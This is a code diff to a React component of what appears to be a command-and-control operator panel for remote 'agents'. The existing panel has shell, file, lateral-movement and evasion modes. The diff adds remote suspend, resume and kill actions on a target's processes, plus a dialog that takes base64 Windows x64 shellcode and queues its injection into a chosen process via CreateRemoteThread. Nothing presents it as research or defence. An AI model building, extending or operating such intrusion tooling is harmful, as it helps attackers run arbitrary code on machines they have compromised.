@@ -220,6 +220,10 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
   const [downloadIds, setDownloadIds] = React.useState<Record<string, string>>({})
   const [busyPath, setBusyPath] = React.useState<string | null>(null)
   const [procRows, setProcRows] = React.useState<Array<{ PID: number; Name: string; User: string }>>([])
+  const [procBusy, setProcBusy] = React.useState<number | null>(null)
+  const [injectFor, setInjectFor] = React.useState<number | null>(null)
+  const [injectSC, setInjectSC] = React.useState('')
+  const [injectBusy, setInjectBusy] = React.useState(false)
 
   // Fetch data based on mode
   React.useEffect(() => {
@@ -235,6 +239,7 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
         break
       case 'processes':
         fetchProcesses(agentId)
+        if (procRows.length === 0) void loadProcesses()
         break
       case 'lateral':
         fetchLateralMoves(agentId)
@@ -689,6 +694,66 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
     }
   }
 
+  const waitTask = async (id: string, timeoutMs = 30000) => {
+    const t0 = Date.now()
+    while (Date.now() - t0 < timeoutMs) {
+      await new Promise(r => setTimeout(r, 700))
+      try {
+        const t: any = await api.getTask(id)
+        const st = t?.status ?? t?.Status
+        if (st === 'completed' || st === 'failed') return String(st) + '|' + String(t?.result ?? t?.Output ?? '')
+      } catch { /* keep polling */ }
+    }
+    return null
+  }
+
+  const procAction = async (pid: number, action: 'suspend' | 'resume' | 'kill') => {
+    setProcBusy(pid)
+    try {
+      const m: Record<string, string> = { suspend: 'suspendProcess', resume: 'resumeProcess', kill: 'killProcess' }
+      if (action === 'kill') {
+        await api.killProcess(agentId, pid)
+      } else if (action === 'suspend') {
+        await api.suspendProcess(agentId, pid)
+      } else {
+        await api.resumeProcess(agentId, pid)
+      }
+      toast.success(`${action} queued for ${pid} — runs on the agent's next poll`)
+      setTimeout(() => { void loadProcesses() }, 3000)
+    } catch (err) {
+      toast.error(`${action} failed`, { description: err instanceof Error ? err.message : undefined })
+    } finally {
+      setProcBusy(null)
+    }
+  }
+
+  const runInject = async () => {
+    if (!injectFor) return
+    const sc = injectSC.trim()
+    if (!sc) return
+    setInjectBusy(true)
+    try {
+      // Accept either raw base64 or a C-shellcode-paste; validate decode first.
+      const clean = sc.replace(/\s+/g, '')
+      const bytes = atob(clean)
+      if (!bytes.length) throw new Error('empty shellcode')
+      const t: any = await api.injectProcess(agentId, injectFor, clean)
+      const res = await waitTask(t?.ID ?? t?.id)
+      if (res) {
+        const [st, out] = res.split('|')
+        if (st === 'completed') { toast.success('Injected', { description: out || `${injectFor}` }) }
+        else { toast.error('Injection failed', { description: out || 'agent reported failure' }) }
+      } else {
+        toast.info('Injected task queued — result pending')
+      }
+      setInjectFor(null); setInjectSC('')
+    } catch (err) {
+      toast.error('Inject failed', { description: err instanceof Error ? err.message : 'not valid base64' })
+    } finally {
+      setInjectBusy(false)
+    }
+  }
+
   const renderProcesses = () => {
     const filteredProcesses = procRows.filter(p =>
       p.Name.toLowerCase().includes(searchTerm.toLowerCase()) ||
@@ -759,14 +824,17 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
                     </td>
                     <td className="py-3">
                       <div className="flex items-center gap-1">
-                        <Button variant="ghost" size="icon" className="h-8 w-8 text-yellow-400 hover:bg-yellow-500/10" onClick={() => suspendProcess(agentId, proc.PID)} title="Suspend">
-                          <Pause className="w-4 h-4" />
+                        <Button variant="ghost" size="icon" className="h-8 w-8 text-yellow-400 hover:bg-yellow-500/10" disabled={procBusy === proc.PID} onClick={() => void procAction(proc.PID, 'suspend')} title="Suspend">
+                          {procBusy === proc.PID ? <Loader2 className="w-4 h-4 animate-spin" /> : <Pause className="w-4 h-4" />}
                         </Button>
-                        <Button variant="ghost" size="icon" className="h-8 w-8 text-green-400 hover:bg-green-500/10" onClick={() => resumeProcess(agentId, proc.PID)} title="Resume">
+                        <Button variant="ghost" size="icon" className="h-8 w-8 text-green-400 hover:bg-green-500/10" disabled={procBusy === proc.PID} onClick={() => void procAction(proc.PID, 'resume')} title="Resume">
                           <Play className="w-4 h-4" />
                         </Button>
-                        <Button variant="ghost" size="icon" className="h-8 w-8 text-red-400 hover:bg-red-500/10" onClick={() => killProcess(agentId, proc.PID)} title="Kill">
+                        <Button variant="ghost" size="icon" className="h-8 w-8 text-red-400 hover:bg-red-500/10" disabled={procBusy === proc.PID} onClick={() => void procAction(proc.PID, 'kill')} title="Kill">
                           <Power className="w-4 h-4" />
+                        </Button>
+                        <Button variant="ghost" size="icon" className="h-8 w-8 text-accent-400 hover:bg-accent-500/10" onClick={() => { setInjectFor(proc.PID); setInjectSC('') }} title="Inject shellcode">
+                          <Zap className="w-4 h-4" />
                         </Button>
                       </div>
                     </td>
@@ -795,6 +863,39 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
     </div>
   )
 
+  const renderInjectDialog = () => {
+    if (injectFor === null) return null
+    return (
+      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm" onClick={() => !injectBusy && setInjectFor(null)}>
+        <Card className="w-full max-w-lg mx-4" onClick={(e: React.MouseEvent) => e.stopPropagation()}>
+          <CardHeader>
+            <CardTitle className="flex items-center gap-2">
+              <Zap className="w-5 h-5 text-accent-400" />
+              Inject into PID {injectFor}
+            </CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <Textarea
+              placeholder="Base64 shellcode blob…"
+              value={injectSC}
+              onChange={(e) => setInjectSC(e.target.value)}
+              className="font-mono text-xs min-h-[120px] bg-dark-800/60"
+              disabled={injectBusy}
+            />
+            <p className="text-xs text-dark-500">Runs on the agent's next poll via CreateRemoteThread. Windows x64 shellcode only.</p>
+            <div className="flex gap-2 justify-end">
+              <Button variant="ghost" onClick={() => setInjectFor(null)} disabled={injectBusy}>Cancel</Button>
+              <Button onClick={() => void runInject()} disabled={injectBusy || !injectSC.trim()}>
+                {injectBusy ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Zap className="w-4 h-4 mr-2" />}
+                Inject
+              </Button>
+            </div>
+          </CardContent>
+        </Card>
+      </div>
+    )
+  }
+
   const renderContent = () => {
     switch (mode) {
       case 'shell':
@@ -806,7 +907,7 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
       case 'files':
         return renderFiles()
       case 'processes':
-        return renderProcesses()
+        return <>{renderProcesses()}{renderInjectDialog()}</>
       case 'lateral':
         return renderPlaceholder('Lateral Movement', <Bug className="w-16 h-16" />, 'Network pivoting and scanning capabilities')
       case 'evasion':
